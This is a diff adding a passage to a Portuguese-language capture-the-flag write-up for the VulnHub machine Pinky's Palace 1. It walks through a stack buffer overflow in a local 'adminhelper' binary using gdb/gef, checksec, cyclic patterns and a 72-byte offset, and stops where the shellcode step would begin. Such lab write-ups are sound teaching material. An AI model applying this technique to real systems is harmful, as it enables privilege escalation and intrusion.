@@ -356,3 +356,65 @@ Ali na pasta do usuário também temos um arquivo de anotação
 
 **Been working on this program to help me when I need to do administrator tasks sudo is just too hard to configure and I can never remember my root password! Sadly I'm fairly new to C so I was working on my printing skills because Im not sure how to implement shell spawning yet :(**
 
+Vamos fazer o buffer overflow nessa aplicação então
+
+## Buffer Overflow
+
+Vamos tentar explicar passo a passo como funciona essa exploração de buffer overflow em linux, a ideia é a mesma do windows, devemos encontrar o EIP, sobrescrever ele e assim ganhar acesso à áreas da memória que teoricamente não deveríamos ter acesso
+
+1. Abrimos ele com o `gdb` mais especificamente o `gef`
+
+```bash
+gdb ./adminhelper
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/buf.png)
+
+2. Verificar as proteções que esse binário tem, com o comando `checksec`
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/buf1.png)
+
+Obs: uma coisa pra se notar é que ele não está com o NX habilitado, ou seja, podemos executar shellcode diretamente na stack.
+
+3. Devemos reproduzir o segmentation fault da aplicação, pra verificar o momento exato em que ele perde o controle da aplicação
+
+Criaremos um `pattern` de 100 bytes
+
+```bash
+pattern create 100
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/buf2.png)
+
+4. Rodamos esse pattern na aplicação, pra verificarmos o que estará no EIP no momento do crash
+
+```bash
+r 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/buf3.png)
+
+O rbp apareceu com a string `jaaaaaaakaaaaaaalaaaaaaamaaa`
+
+5. Descobrimos o momento exato do crash
+
+```bash
+pattern offset 'jaaaaaaakaaaaaaalaaaaaaamaaa'
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/buf4.png)
+
+6. Criamos o offset em python pra comprovarmos o crash
+
+```bash
+python -c "print 'A'*72"
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/buf5.png)
+
+E comprovamos o crash
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/buf6.png)
+
+7. Jogamos o shellcode ali dentro dele, nesse espaço de memória pra ser executado
+
